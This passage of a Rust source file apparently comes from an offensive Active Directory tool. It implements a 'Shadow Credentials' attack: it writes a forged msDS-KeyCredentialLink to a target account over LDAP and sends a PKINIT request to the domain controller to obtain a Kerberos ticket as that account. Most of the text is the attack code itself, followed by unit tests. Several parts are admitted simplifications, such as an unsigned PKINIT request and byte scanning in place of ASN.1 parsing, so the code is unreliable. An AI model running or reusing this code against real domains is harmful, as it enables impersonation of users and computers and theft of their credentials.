        KeyPair::generate().map_err(|e| anyhow!("Failed to generate key pair: {}", e))?;

    // Create self-signed certificate
    let cert = params
        .self_signed(&key_pair)
        .map_err(|e| anyhow!("Failed to create self-signed cert: {}", e))?;

    let cert_der = cert.der().to_vec();
    let key_der = key_pair.serialize_der();

    debug!(
        "Generated self-signed cert for '{}', cert_der={}",
        subject,
        cert_der.len()
    );

    Ok((key_der, cert_der))
}

// ── Key Credential Link Construction ────────────────────────────────────────

/// Compute the SHA-1 hash of the certificate's public key info.
///
/// This is used as the KeyIdentifier in the Key Credential Link structure.
fn compute_key_identifier(cert_der: &[u8]) -> [u8; 20] {
    use sha1::{Digest as _, Sha1};

    // For a proper implementation, we'd extract the SubjectPublicKeyInfo
    // from the DER-encoded certificate and hash it.  Here we hash the
    // full cert DER as a practical approximation (the DC validates the
    // full credential link, not just this field independently).
    let mut hasher = Sha1::new();
    hasher.update(cert_der);
    let result = hasher.finalize();
    let mut key_id = [0u8; 20];
    key_id.copy_from_slice(&result);
    key_id
}

/// Build the `msDS-KeyCredentialLink` binary value.
///
/// Format (from MS-ADTS):
/// ```text
/// Version (2 bytes, 0x0001)
/// Reserved (2 bytes, 0x0000)
/// KeyIdentifier (20 bytes, SHA-1 of public key info)
/// DeviceId (16 bytes, GUID)
/// CustomKeyInformation (variable):
///   Version (1 byte, 0x01)
///   Reserved1 (1 byte, 0x00)
///   Reserved2 (1 byte, 0x00)
///   Flags (1 byte, 0x00)
///   KeyUsage (1 byte, 0x01 = NK_OR_PK)
///   KeySource (1 byte, 0x00)
///   KeyIso (2 bytes, 0x00 0x00)
///   KeyStrength (variable, unused)
///   KeyAlgorithm (variable, unused)
///   KeyCertificationAuthority (variable, unused)
/// KeyApproximateLastLogonTimeStamp (8 bytes, FILETIME)
/// Credential (variable, DER-encoded X.509 certificate)
/// ```
pub fn build_key_credential_link(cert_der: &[u8], device_id: &str) -> Result<Vec<u8>> {
    let mut link = Vec::with_capacity(256);

    // Version: 0x0001
    link.extend_from_slice(&1u16.to_le_bytes());

    // Reserved: 0x0000
    link.extend_from_slice(&0u16.to_le_bytes());

    // KeyIdentifier: SHA-1 of cert DER
    let key_id = compute_key_identifier(cert_der);
    link.extend_from_slice(&key_id);

    // DeviceId: parse GUID string or generate random
    let device_guid = parse_or_generate_guid(device_id)?;
    link.extend_from_slice(&device_guid);

    // CustomKeyInformation
    // Version 1, minimal format
    let custom_key_info = build_custom_key_information();
    // Length-prefixed CustomKeyInformation
    link.extend_from_slice(&(custom_key_info.len() as u16).to_le_bytes());
    link.extend_from_slice(&custom_key_info);

    // KeyApproximateLastLogonTimeStamp: current FILETIME
    let now_filetime = unix_epoch_to_filetime(std::time::SystemTime::now());
    link.extend_from_slice(&now_filetime.to_le_bytes());

    // Credential: the full DER-encoded X.509 certificate
    link.extend_from_slice(cert_der);

    debug!(
        "Built key credential link: {} bytes, device_id={}",
        link.len(),
        device_id
    );

    Ok(link)
}

/// Build the CustomKeyInformation sub-structure.
///
/// This is a simplified version with the minimum required fields.
fn build_custom_key_information() -> Vec<u8> {
    let mut info = Vec::with_capacity(32);

    // Version: 0x01
    info.push(0x01);
    // Reserved1: 0x00
    info.push(0x00);
    // Reserved2: 0x00
    info.push(0x00);
    // Flags: 0x00
    info.push(0x00);
    // KeyUsage: 0x01 (NK_OR_PK — used for both Network Key and Public Key)
    info.push(0x01);
    // KeySource: 0x00 (unknown)
    info.push(0x00);
    // KeyIso: 0x00 0x00
    info.extend_from_slice(&[0x00, 0x00]);

    info
}

/// Parse a GUID string or generate a random GUID.
fn parse_or_generate_guid(guid_str: &str) -> Result<[u8; 16]> {
    // Try to parse as GUID format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
    let cleaned: String = guid_str.chars().filter(|c| *c != '-').collect();
    if cleaned.len() == 32 {
        let bytes: Vec<u8> = (0..16)
            .map(|i| {
                u8::from_str_radix(&cleaned[i * 2..i * 2 + 2], 16)
                    .unwrap_or(0)
            })
            .collect();

        // GUIDs in AD are stored in mixed-endian format:
        // First 4 bytes: little-endian
        // Next 2 bytes: little-endian
        // Next 2 bytes: little-endian
        // Remaining 8 bytes: big-endian
        let mut result = [0u8; 16];
        result[0] = bytes[3];
        result[1] = bytes[2];
        result[2] = bytes[1];
        result[3] = bytes[0];
        result[4] = bytes[5];
        result[5] = bytes[4];
        result[6] = bytes[7];
        result[7] = bytes[6];
        result[8..16].copy_from_slice(&bytes[8..16]);

        return Ok(result);
    }

    // Generate a random GUID
    let mut guid = [0u8; 16];
    getrandom::getrandom(&mut guid)
        .map_err(|e| anyhow!("Failed to generate random GUID: {}", e))?;

    // Set version 4 (random) and variant bits
    guid[6] = (guid[6] & 0x0F) | 0x40; // Version 4
    guid[8] = (guid[8] & 0x3F) | 0x80; // Variant 1

    Ok(guid)
}

/// Convert a SystemTime to a Windows FILETIME (100-nanosecond intervals since 1601-01-01).
fn unix_epoch_to_filetime(t: std::time::SystemTime) -> u64 {
    const EPOCH_DIFFERENCE: u64 = 11644473600; // seconds between 1601 and 1970
    let unix_seconds = t
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    (unix_seconds + EPOCH_DIFFERENCE) * 10_000_000
}

// ── PKINIT Kerberos Authentication ──────────────────────────────────────────

/// Construct and send a PKINIT AS-REQ to the KDC.
///
/// This builds a minimal Kerberos AS-REQ with PA-PK-AS-REQ pre-authentication
/// data containing the client certificate and a signed nonce.  The KDC validates
/// the certificate against the `msDS-KeyCredentialLink` on the target object.
///
/// **NOTE**: This is a simplified implementation.  A full PKINIT implementation
/// requires proper CMS/PKCS#7 signed data construction with the client's
/// private key.  For production use, this should be replaced with a proper
/// Kerberos library or SSPI-based approach.
pub fn authenticate_via_pkinit(
    target_upn: &str,
    private_key: &[u8],
    cert_der: &[u8],
    dc_hostname: &str,
) -> Result<PkinitAuthResult> {
    // Build the AS-REQ with PKINIT pre-auth
    let as_req = build_pkinit_as_req(target_upn, private_key, cert_der)?;

    // Send to KDC on port 88
    let response = send_kdc_request(dc_hostname, 88, &as_req)?;

    // Parse the AS-REP to extract TGT
    let tgt = parse_as_rep(&response, target_upn)?;

    Ok(tgt)
}

/// Build a minimal PKINIT AS-REQ.
///
/// Structure:
/// ```text
/// AS-REQ [APPLICATION 0] {
///   pvno: 5
///   msg-type: 10 (AS-REQ)
///   padata: [ PA-PK-AS-REQ { ... } ]
///   req-body: {
///     kdc-options: forwardable, renewable, canonicalize
///     cname: { name-type: NT-PRINCIPAL, name-string: [target_upn] }
///     realm: <domain from UPN>
///     sname: { name-type: NT-SRV_INST, name-string: ["krbtgt", realm] }
///     till: 1970-01-01 (no expiry)
///     nonce: random
///     etype: [aes256-cts-hmac-sha1-96]
///   }
/// }
/// ```
fn build_pkinit_as_req(
    target_upn: &str,
    _private_key: &[u8],
    cert_der: &[u8],
) -> Result<Vec<u8>> {
    // Split UPN into components
    let parts: Vec<&str> = target_upn.split('@').collect();
    let (username, realm) = if parts.len() == 2 {
        (parts[0], parts[1])
    } else {
        (target_upn, "UNKNOWN")
    };

    // ── Build PA-PK-AS-REQ ──
    // This is a simplified PKINIT pre-auth structure.
    // In a full implementation, this would contain a CMS SignedData
    // with the client certificate and a signed authenticator.

    // PA-PK-AS-REQ content (simplified)
    let auth_pack_parts = build_auth_pack(cert_der, username, realm)?;
    let auth_pack_seq = der_sequence(&auth_pack_parts.concat());

    // Wrap in PA-DATA
    let pa_pk_as_req_content = [
        // padata-type: 16 (PKINIT PA-PK-AS-REQ)
        der_integer(16),
        // padata-value: OCTET STRING containing the AuthPack
        der_octet_string(&auth_pack_seq),
    ]
    .concat();
    let pa_pk_as_req = der_sequence(&pa_pk_as_req_content);

    // ── Build req-body ──
    let kdc_options = 0x40810000u32; // forwardable | renewable | canonicalize
    let nonce = rand::random::<u32>();

    // cname inner: name-type + name-string
    let cname_inner = [
        der_integer(1),                                   // NT-PRINCIPAL
        der_sequence(&der_general_string(username)),      // name-string
    ]
    .concat();

    // sname inner: name-type + name-string
    let sname_names = [
        der_general_string("krbtgt"),
        der_general_string(realm),
    ]
    .concat();
    let sname_inner = [
        der_integer(2),                      // NT-SRV_INST
        der_sequence(&sname_names),
    ]
    .concat();

    let req_body_content = [
        // kdc-options [0]
        der_context_explicit(0, &der_bit_string(&kdc_options.to_be_bytes())),
        // cname [1]
        der_context_explicit(1, &der_sequence(&cname_inner)),
        // realm [2]
        der_context_explicit(2, &der_general_string(realm)),
        // sname [3]
        der_context_explicit(3, &der_sequence(&sname_inner)),
        // from [4] — optional, omit
        // till [5]
        der_context_explicit(5, &der_general_string("19700101000000Z")),
        // rtime [6] — optional, omit
        // nonce [7]
        der_context_explicit(7, &der_integer(nonce as i64)),
        // etype [8]
        der_context_explicit(
            8,
            &der_sequence(&der_integer(ETYPE_AES256_CTS_HMAC_SHA1_96 as i64)),
        ),
    ]
    .concat();

    let req_body = der_sequence(&req_body_content);

    // ── Build full AS-REQ ──
    let pa_data_seq = der_sequence(&pa_pk_as_req);
    let as_req_content = [
        // pvno: 5
        der_integer(KRB_PVNO as i64),
        // msg-type: 10 (AS-REQ)
        der_integer(KRB_AS_REQ_MSG_TYPE as i64),
        // padata [3]
        der_context_explicit(3, &pa_data_seq),
        // req-body [4]
        der_context_explicit(4, &req_body),
    ]
    .concat();

    // APPLICATION 0 tag
    let as_req = der_wrap(ASN1_APPLICATION, &as_req_content);

    debug!(
        "Built PKINIT AS-REQ: {} bytes for {}@{}",
        as_req.len(),
        username,
        realm
    );

    Ok(as_req)
}

/// Build the AuthPack for PKINIT PA-PK-AS-REQ.
///
/// Simplified version — contains the client certificate and a
/// PKAuthenticator with a timestamp and nonce.
fn build_auth_pack(cert_der: &[u8], _username: &str, _realm: &str) -> Result<Vec<Vec<u8>>> {
    let nonce = rand::random::<u32>();
    let now = kerberos_timestamp();

    // PKAuthenticator inner content
    let pk_auth_content = [
        // cuSec [0]: 0
        der_context_explicit(0, &der_integer(0)),
        // cusec [1]: microseconds
        der_context_explicit(1, &der_integer(0)),
        // ctime [2]: timestamp
        der_context_explicit(2, &der_general_string(&format_kerberos_time(now))),
        // nonce [3]: random nonce
        der_context_explicit(3, &der_integer(nonce as i64)),
    ]
    .concat();
    let pk_authenticator = der_sequence(&pk_auth_content);

    // AuthPack content = pkAuthenticator + clientPublicValue
    let auth_pack_content = [
        // pkAuthenticator
        pk_authenticator,
        // clientPublicValue — the certificate DER as BIT STRING
        der_bit_string(cert_der),
    ]
    .concat();

    Ok(vec![auth_pack_content])
}

/// Format a Unix timestamp as a Kerberos time string (YYYYMMDDHHMMSSZ).
fn format_kerberos_time(ts: i64) -> String {
    // Simplified: use chrono-like calculation
    let days = ts / 86400;
    let time_of_day = ts % 86400;
    let hours = time_of_day / 3600;
    let minutes = (time_of_day % 3600) / 60;
    let seconds = time_of_day % 60;

    // Approximate date calculation from epoch
    let (year, month, day) = days_to_ymd(days);
    format!(
        "{:04}{:02}{:02}{:02}{:02}{:02}Z",
        year, month, day, hours, minutes, seconds
    )
}

/// Convert days since epoch to year/month/day.
fn days_to_ymd(mut days: i64) -> (i64, i64, i64) {
    let mut year = 1970;
    loop {
        let year_days = if is_leap_year(year) { 366 } else { 365 };
        if days < year_days {
            break;
        }
        days -= year_days;
        year += 1;
    }

    let leap = is_leap_year(year);
    let month_days = [
        31,
        if leap { 29 } else { 28 },
        31,
        30,
        31,
        30,
        31,
        31,
        30,
        31,
        30,
        31,
    ];

    let mut month = 1;
    for &md in &month_days {
        if days < md {
            break;
        }
        days -= md;
        month += 1;
    }

    (year, month, days + 1)
}

fn is_leap_year(year: i64) -> bool {
    (year % 4 == 0 && year % 100 != 0) || year % 400 == 0
}

/// Send a Kerberos request to the KDC via TCP.
fn send_kdc_request(dc_hostname: &str, port: u16, request: &[u8]) -> Result<Vec<u8>> {
    use std::io::{Read, Write};
    use std::net::TcpStream;

    let addr = format!("{}:{}", dc_hostname, port);
    debug!("Connecting to KDC at {}", addr);

    let mut stream =
        TcpStream::connect_timeout(&addr.parse()?, std::time::Duration::from_secs(10))
            .with_context(|| format!("Failed to connect to KDC at {}", addr))?;

    // KDC TCP framing: 4-byte big-endian length prefix
    let len = request.len() as u32;
    stream.write_all(&len.to_be_bytes())?;
    stream.write_all(request)?;
    stream.flush()?;

    // Read response
    let mut response_len_buf = [0u8; 4];
    stream.read_exact(&mut response_len_buf)?;
    let response_len = u32::from_be_bytes(response_len_buf) as usize;

    if response_len > 1024 * 1024 {
        bail!("KDC response too large: {} bytes", response_len);
    }

    let mut response = vec![0u8; response_len];
    stream.read_exact(&mut response)?;

    debug!("Received KDC response: {} bytes", response.len());
    Ok(response)
}

/// Parse the AS-REP response to extract the TGT.
fn parse_as_rep(response: &[u8], _target_upn: &str) -> Result<PkinitAuthResult> {
    // Check for KRB-ERROR response (APPLICATION 30)
    if !response.is_empty() && response[0] == 0x7E {
        // Parse error code from the KRB-ERROR
        let error_code = parse_krb_error(response)?;
        bail!("KDC returned error: {} (0x{:08X})", error_code, error_code);
    }

    // Check for AS-REP (APPLICATION 11)
    if response.is_empty() || response[0] != ASN1_APPLICATION_11 {
        bail!(
            "Unexpected AS-REP tag: 0x{:02X}",
            response.first().copied().unwrap_or(0)
        );
    }

    // Extract the ticket from the AS-REP.
    // Full parsing would require ASN.1 DER decoding. For now, we return
    // the raw response as the "TGT" for the caller to process.
    //
    // A production implementation would:
    // 1. Parse the AS-REP to extract enc-part and ticket
    // 2. Decrypt enc-part using the PKINIT-derived key
    // 3. Extract the TGT session key
    // 4. Return both the TGT and session key

    // Try to locate the ticket field (tagged [5] in AS-REP)
    let ticket = extract_ticket_from_as_rep(response)?;

    Ok(PkinitAuthResult {
        tgt_bytes: ticket,
        session_key: Vec::new(), // Would need PKINIT key derivation
    })
}

/// Parse a KRB-ERROR to extract the error code.
fn parse_krb_error(data: &[u8]) -> Result<u32> {
    // KRB-ERROR structure contains msg-type (30) and error-code fields.
    // Simplified: scan for the error code.
    // The error code is typically after msg-type ( INTEGER 30 ),
    // then ctime, cusec, stime, susec, error-code.

    // Skip the APPLICATION 30 tag and length
    let mut pos = skip_tag_length(data, 0)?;

    // Look for error-code: scan for INTEGER tags after msg-type
    let mut int_count = 0;
    while pos < data.len() {
        if data[pos] == ASN1_INTEGER {
            let (value, next) = parse_der_integer(data, pos)?;
            pos = next;
            int_count += 1;
            // error-code is the 5th integer (after pvno, msg-type, cusec, susec)
            if int_count == 5 {
                return Ok(value as u32);
            }
        } else {
            pos += 1;
        }
    }

    // Fallback: return generic error
    Ok(0xFFFFFFFF)
}

/// Skip a DER tag and length, returning the position after the length bytes.
fn skip_tag_length(data: &[u8], pos: usize) -> Result<usize> {
    if pos >= data.len() {
        bail!("Unexpected end of data at position {}", pos);
    }
    let mut p = pos + 1; // skip tag
    if p >= data.len() {
        bail!("Unexpected end of data");
    }
    if data[p] < 128 {
        p += 1;
    } else if data[p] == 0x80 {
        // Indefinite length — not supported
        bail!("Indefinite DER length not supported");
    } else {
        let num_bytes = (data[p] & 0x7F) as usize;
        p += 1 + num_bytes;
    }
    Ok(p)
}

/// Parse a DER INTEGER at the given position.
fn parse_der_integer(data: &[u8], pos: usize) -> Result<(i64, usize)> {
    if pos >= data.len() || data[pos] != ASN1_INTEGER {
        bail!("Expected INTEGER tag at position {}", pos);
    }
    let mut p = pos + 1;
    if p >= data.len() {
        bail!("Unexpected end of data");
    }
    let len = if data[p] < 128 {
        data[p] as usize
    } else {
        bail!("Multi-byte length not supported for integer at {}", pos);
    };
    p += 1;

    if p + len > data.len() {
        bail!("Integer extends beyond data");
    }

    let mut value: i64 = 0;
    for i in 0..len {
        value = (value << 8) | data[p + i] as i64;
    }

    Ok((value, p + len))
}

/// Extract the ticket field from an AS-REP.
fn extract_ticket_from_as_rep(data: &[u8]) -> Result<Vec<u8>> {
    // The ticket is in the [5] field of AS-REP.
    // Scan for context tag 5 (0xA5) and extract the content.
    let mut pos = 0;
    while pos < data.len().saturating_sub(2) {
        if data[pos] == 0xA5 {
            // Found context tag 5 (ticket)
            let mut p = pos + 1;
            if p < data.len() {
                let len = if data[p] < 128 {
                    data[p] as usize
                } else if data[p] == 0x81 && p + 1 < data.len() {
                    p += 1;
                    data[p] as usize
                } else if data[p] == 0x82 && p + 2 < data.len() {
                    p += 1;
                    let len = ((data[p] as usize) << 8) | data[p + 1] as usize;
                    p += 1;
                    len
                } else {
                    pos += 1;
                    continue;
                };
                p += 1;
                if p + len <= data.len() {
                    let ticket = data[pos..p + len].to_vec();
                    return Ok(ticket);
                }
            }
        }
        pos += 1;
    }

    // If we can't parse the ticket, return the full response
    warn!("Could not extract ticket from AS-REP, returning full response");
    Ok(data.to_vec())
}

// ── Attack Orchestration ────────────────────────────────────────────────────

/// Execute the full Shadow Credentials attack.
///
/// **Attack flow**:
/// 1. Resolve target DN from the target name
/// 2. Check write access to `msDS-KeyCredentialLink`
/// 3. Generate a self-signed certificate
/// 4. Build the key credential link
/// 5. Write it to the target object via LDAP
/// 6. Authenticate as the target via PKINIT
/// 7. Return the result (TGT, status)
///
/// **Cleanup**: The credential link is removed after use.
pub fn shadow_credentials_attack(target: &str) -> Result<ShadowCredentialsResult> {
    // Step 0: Discover DC
    let dc_hostname = discover_dc()?;

    // Step 1: Connect to LDAP
    let ldap = LdapConnection::connect(&dc_hostname)?;

    // Step 2: Get default naming context
    let base_dn = ldap.get_default_naming_context()?;

    // Step 3: Determine if target is a user or computer
    let is_computer = target.ends_with('$') || target.to_uppercase().starts_with("CN=");

    // Step 4: Resolve target DN
    let target_dn = if target.contains('=') {
        // Already a DN
        target.to_string()
    } else {
        ldap.search_dn(&base_dn, target, is_computer)?
    };

    // Step 5: Check write access
    if !ldap.can_modify_key_credential_link(&target_dn)? {
        bail!(
            "Current user does not have write access to msDS-KeyCredentialLink on {}",
            target_dn
        );
    }

    // Step 6: Get target UPN
    let target_upn = ldap.get_upn(&target_dn)?;

    // Step 7: Generate self-signed cert
    let (private_key, cert_der) = generate_self_signed_cert(&target_upn)?;

    // Step 8: Build key credential link
    let device_id = format!(
        "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
        rand::random::<u32>(),
        rand::random::<u16>(),
        (rand::random::<u16>() & 0x0FFF) | 0x4000, // version 4
        (rand::random::<u16>() & 0x3FFF) | 0x8000, // variant 1
        rand::random::<u64>() & 0xFFFFFFFFFFFF
    );
    let credential_link = build_key_credential_link(&cert_der, &device_id)?;

    // Step 9: Write the credential link to the target
    info!("Writing key credential link to {}", target_dn);
    ldap.add_key_credential_link(&target_dn, &credential_link)?;

    // Step 10: Authenticate via PKINIT
    let auth_result = match authenticate_via_pkinit(&target_upn, &private_key, &cert_der, &dc_hostname) {
        Ok(result) => {
            info!("PKINIT authentication successful for {}", target_upn);
            Some(base64::engine::general_purpose::STANDARD.encode(&result.tgt_bytes))
        }
        Err(e) => {
            warn!("PKINIT authentication failed: {:#}", e);
            None
        }
    };

    // Step 11: Clean up — remove the credential link
    let cleaned_up = match ldap.remove_key_credential_link(&target_dn, &credential_link) {
        Ok(()) => {
            info!("Cleaned up key credential link on {}", target_dn);
            true
        }
        Err(e) => {
            warn!("Failed to clean up key credential link: {:#}", e);
            false
        }
    };

    Ok(ShadowCredentialsResult {
        target_dn,
        target_upn,
        device_id,
        tgt_b64: auth_result,
        cleaned_up,
        status: if cleaned_up {
            "success".to_string()
        } else {
            "partial — credential link not cleaned up".to_string()
        },
    })
}

/// Retrieve the domain controller hostname (public wrapper).
pub fn get_dc_hostname() -> Result<String> {
    discover_dc()
}

/// Check if the current user can modify the target's KeyCredentialLink.
pub fn check_write_access(target_dn: &str) -> Result<bool> {
    let dc_hostname = discover_dc()?;
    let ldap = LdapConnection::connect(&dc_hostname)?;
    ldap.can_modify_key_credential_link(target_dn)
}

// ── Tests ───────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_der_length() {
        assert_eq!(der_length(0), vec![0x00]);
        assert_eq!(der_length(127), vec![0x7F]);
        assert_eq!(der_length(128), vec![0x81, 0x80]);
        assert_eq!(der_length(255), vec![0x81, 0xFF]);
        assert_eq!(der_length(256), vec![0x82, 0x01, 0x00]);
    }

    #[test]
    fn test_der_integer() {
        let result = der_integer(0);
        assert_eq!(result, vec![ASN1_INTEGER, 0x01, 0x00]);

        let result = der_integer(1);
        assert_eq!(result, vec![ASN1_INTEGER, 0x01, 0x01]);

        let result = der_integer(128);
        assert_eq!(result, vec![ASN1_INTEGER, 0x02, 0x00, 0x80]);

        let result = der_integer(5);
        assert_eq!(result, vec![ASN1_INTEGER, 0x01, 0x05]);
    }

    #[test]
    fn test_der_general_string() {
        let result = der_general_string("KRBTGT");
        assert_eq!(result[0], ASN1_GENERAL_STRING);
        assert_eq!(result[1], 6); // length
        assert_eq!(&result[2..], b"KRBTGT");
    }

    #[test]
    fn test_der_octet_string() {
        let data = vec![0x01, 0x02, 0x03];
        let result = der_octet_string(&data);
        assert_eq!(result[0], ASN1_OCTET_STRING);
        assert_eq!(result[1], 3);
        assert_eq!(&result[2..], &[0x01, 0x02, 0x03]);
    }

    #[test]
    fn test_der_sequence() {
        let content = vec![0x01, 0x02];
        let result = der_sequence(&content);
        assert_eq!(result[0], ASN1_SEQUENCE);
        assert_eq!(result[1], 2);
        assert_eq!(&result[2..], &[0x01, 0x02]);
    }

    #[test]
    fn test_der_context_explicit() {
        let content = vec![0x42];
        let result = der_context_explicit(3, &content);
        assert_eq!(result[0], 0xA3);
        assert_eq!(result[1], 1);
        assert_eq!(result[2], 0x42);
    }

    #[test]
    fn test_der_bit_string() {
        let data = vec![0xFF, 0x00];
        let result = der_bit_string(&data);
        assert_eq!(result[0], ASN1_BIT_STRING);
        assert_eq!(result[1], 3); // 1 unused-byte byte + 2 data bytes
        assert_eq!(result[2], 0x00); // no unused bits
        assert_eq!(&result[3..], &[0xFF, 0x00]);
    }

    #[test]
    fn test_build_custom_key_information() {
        let info = build_custom_key_information();
        assert!(!info.is_empty());
        assert_eq!(info[0], 0x01); // version
        assert_eq!(info[4], 0x01); // key usage = NK_OR_PK
    }

    #[test]
    fn test_parse_or_generate_guid() {
        // Valid GUID string
        let result = parse_or_generate_guid("12345678-abcd-1234-abcd-123456789012");
        assert!(result.is_ok());
        let bytes = result.unwrap();
        assert_eq!(bytes.len(), 16);

        // Mixed-endian: first 4 bytes should be reversed
        assert_eq!(bytes[0], 0x78);
        assert_eq!(bytes[1], 0x56);
        assert_eq!(bytes[2], 0x34);
        assert_eq!(bytes[3], 0x12);

        // Invalid string — should generate random GUID
        let result = parse_or_generate_guid("invalid");
        assert!(result.is_ok());
        let bytes = result.unwrap();
        assert_eq!(bytes.len(), 16);
        // Version 4 check
        assert_eq!(bytes[6] & 0xF0, 0x40);
        // Variant check
        assert_eq!(bytes[8] & 0xC0, 0x80);
    }

    #[test]
    fn test_format_kerberos_time() {
        // Epoch (1970-01-01 00:00:00 UTC)
        let result = format_kerberos_time(0);
        assert_eq!(result, "19700101000000Z");

        // Some known timestamp
        let result = format_kerberos_time(1700000000);
        assert!(result.starts_with("20"));
        assert!(result.ends_with("Z"));
        assert_eq!(result.len(), 15);
    }

    #[test]
    fn test_unix_epoch_to_filetime() {
        let ft = unix_epoch_to_filetime(std::time::UNIX_EPOCH);
        // 1601-01-01 to 1970-01-01 = 11644473600 seconds = 116444736000000000 100ns intervals
        assert_eq!(ft, 116444736000000000);
    }

    #[test]
    fn test_build_key_credential_link() {
        let cert_der = vec![0x30, 0x82, 0x01, 0x00, 0x01, 0x02, 0x03]; // fake cert
        let result = build_key_credential_link(&cert_der, "12345678-1234-1234-1234-123456789012");
        assert!(result.is_ok());

        let link = result.unwrap();
        // Check version
        assert_eq!(link[0], 0x01); // version low byte
        assert_eq!(link[1], 0x00); // version high byte
        // Check reserved
        assert_eq!(link[2], 0x00);
        assert_eq!(link[3], 0x00);
        // KeyIdentifier (20 bytes) starts at offset 4
        // DeviceId (16 bytes) starts at offset 24
        // Then CustomKeyInformation length (2 bytes) + data
        // Then FILETIME (8 bytes)
        // Then cert DER
    }

    #[test]
    fn test_generate_self_signed_cert() {
        let result = generate_self_signed_cert("testuser@domain.com");
        match result {
            Ok((private_key, cert_der)) => {
                assert!(!private_key.is_empty());
                assert!(!cert_der.is_empty());
                // Certificate should start with SEQUENCE tag (0x30)
                assert_eq!(cert_der[0], 0x30);
            }
            Err(e) => {
                // rcgen may fail in cross-compile test environments
                eprintln!("Cert generation skipped: {}", e);
            }
        }
    }

    #[test]
    fn test_no_password_change_references() {
        // Verify that this module does not contain references to password change
        let source = include_str!("shadow_credentials.rs");
        assert!(!source.contains("SetPassword"));
        assert!(!source.contains("ChangePassword"));
        assert!(!source.contains("NetUserSetInfo"));
        assert!(!source.contains("pwdLastSet"));
    }

    #[test]
    fn test_no_domain_admin_requirement() {
        // Verify documentation states no Domain Admin required
        let source = include_str!("shadow_credentials.rs");
        assert!(source.contains("does NOT require Domain Admin"));
    }
}
